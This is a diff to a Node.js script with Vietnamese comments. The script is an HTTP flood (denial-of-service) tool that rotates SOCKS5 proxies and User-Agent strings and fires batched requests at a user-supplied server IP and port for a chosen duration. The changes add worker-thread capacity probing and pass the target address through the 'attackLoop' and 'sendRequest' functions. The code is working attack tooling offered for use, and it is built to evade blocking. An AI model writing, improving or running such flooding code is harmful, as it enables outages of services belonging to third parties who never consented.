@@ -3,6 +3,7 @@ const axios = require("axios");
 const SocksProxyAgent = require("socks5-https-client/lib/Agent");
 const readline = require("readline-sync");
 const os = require("os");
+const { Worker } = require("worker_threads");
 
 // Đọc danh sách proxy SOCKS5 và User-Agent từ file
 const proxies = fs.readFileSync("socks5.txt", "utf-8").split("\n").filter(Boolean);
@@ -31,35 +32,41 @@ async function checkKey() {
     }
 }
 
-// Kiểm tra số luồng tối đa thiết bị có thể chạy
+// Kiểm tra số luồng tối đa thiết bị có thể chạy bằng Worker Threads
 async function testMaxThreads() {
-    console.log("🔍 Đang kiểm tra số luồng tối đa có thể chạy...");
-    let testThreads = os.cpus().length * 5;
-    let activeThreads = 0;
-    let maxThreads = 0;
+    console.log("\n🔍 Đang kiểm tra số luồng tối đa có thể chạy...");
 
-    const testTasks = [];
-    for (let i = 0; i < testThreads; i++) {
-        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
-        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
+    return new Promise((resolve) => {
+        const cpuThreads = os.cpus().length * 2; // Nhân đôi số CPU logic để tìm maxThreads
+        let availableThreads = 0;
+        let workers = [];
 
-        testTasks.push(
-            sendRequest(proxy, userAgent).then((responseTime) => {
-                if (responseTime !== null) {
-                    activeThreads++;
-                    maxThreads = Math.max(maxThreads, activeThreads);
-                }
-            })
-        );
-    }
+        function checkThread() {
+            if (workers.length >= cpuThreads) {
+                workers.forEach(worker => worker.terminate());
+                console.log(`✅ Số luồng tối ưu phát hiện: ${availableThreads}`);
+                return resolve(availableThreads);
+            }
 
-    await Promise.allSettled(testTasks);
-    console.log(`✅ Số luồng tối ưu phát hiện: ${maxThreads}`);
-    return maxThreads;
+            const worker = new Worker(`
+                const { parentPort } = require('worker_threads');
+                setTimeout(() => parentPort.postMessage("done"), 100);
+            `, { eval: true });
+
+            worker.on('message', () => {
+                availableThreads++;
+                checkThread();
+            });
+
+            workers.push(worker);
+        }
+
+        checkThread();
+    });
 }
 
 // Gửi yêu cầu HTTP qua proxy
-async function sendRequest(proxy, userAgent) {
+async function sendRequest(proxy, userAgent, serverIp, serverPort) {
     const [host, port] = proxy.split(":");
     const agent = new SocksProxyAgent({ socksHost: host, socksPort: parseInt(port) });
 
@@ -76,7 +83,7 @@ async function sendRequest(proxy, userAgent) {
 }
 
 // Hàm chạy tấn công đa luồng với số request trong 0.1 giây
-async function attackLoop(threadsCount, attackDuration, requestsPerBatch) {
+async function attackLoop(threadsCount, attackDuration, requestsPerBatch, serverIp, serverPort) {
     console.log("\n🚀 Bắt đầu tấn công...\n");
     const startTime = Date.now();
     let requestCount = 0;
@@ -91,7 +98,7 @@ async function attackLoop(threadsCount, attackDuration, requestsPerBatch) {
                 const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
 
                 tasks.push(
-                    sendRequest(proxy, userAgent).then((success) => {
+                    sendRequest(proxy, userAgent, serverIp, serverPort).then((success) => {
                         if (success) {
                             requestCount++;
                             dataSent += 500;
@@ -127,5 +134,5 @@ async function attackLoop(threadsCount, attackDuration, requestsPerBatch) {
     if (threadsCount === 0) threadsCount = maxThreads;
     const attackDuration = parseInt(readline.question("⏳ Nhập thời gian tấn công (giây): ")) * 1000;
 
-    attackLoop(threadsCount, attackDuration, requestsPerBatch);
+    attackLoop(threadsCount, attackDuration, requestsPerBatch, serverIp, serverPort);
 })();
